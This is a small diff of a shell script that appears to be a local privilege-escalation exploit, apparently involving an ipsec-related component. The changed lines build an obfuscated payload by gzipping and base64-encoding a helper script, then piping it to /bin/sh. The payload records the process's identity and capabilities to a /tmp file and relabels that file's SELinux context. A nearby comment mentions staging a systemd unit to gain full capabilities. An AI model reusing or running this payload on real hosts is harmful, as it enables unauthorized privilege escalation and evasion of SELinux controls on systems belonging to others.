@@ -79,7 +79,7 @@ if [ "${selinux}" == "true" ];then
     fi
     b64p="$( cat activation-pull.sh | gzip | base64 -w0 )"
     outfile="/tmp/ipsec.out-$( date +%s )"
-    payload="\"BCMD='${b64p}';umask 0000;echo \${BCMD} | base64 -d | gzip -d | CMD='{ id; grep ^Cap /proc/self/status; } > ${outfile}' /bin/sh;chcon -t user_tmp_t ${outfile}\""
+    payload="\"BCMD='${b64p}';umask 0000;echo \${BCMD} | base64 -d | gzip -d | CMD='{ id; grep ^Cap /proc/self/status; } > ${outfile};chcon -t user_tmp_t ${outfile}' /bin/sh\""
   # fi
 else
   # not selinux, stage a systemd unit file to get full caps
